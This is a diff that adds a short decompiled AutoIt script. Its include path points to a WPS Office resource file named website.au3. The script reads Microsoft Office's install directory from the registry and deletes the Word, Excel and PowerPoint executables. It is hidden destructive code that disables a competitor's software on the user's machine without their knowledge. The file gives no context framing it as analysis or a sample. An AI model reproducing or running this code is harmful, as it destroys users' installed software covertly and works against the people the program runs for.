@@ -1,0 +1,14 @@
+; <AUT2EXE VERSION: 3.2.4.7>
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: D:\Res\WPSOffice\website.au3>
+; ----------------------------------------------------------------------------
+$var = RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Options","PROGRAMDIR")
+FileDelete ($var & "WINWORD.EXE")
+$var = RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Options","PROGRAMDIR")
+FileDelete ($var & "EXCEL.EXE")
+$var = RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Options","PROGRAMDIR")
+FileDelete ($var & "POWERPNT.EXE")
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: D:\Res\WPSOffice\website.au3>
+; ----------------------------------------------------------------------------
+
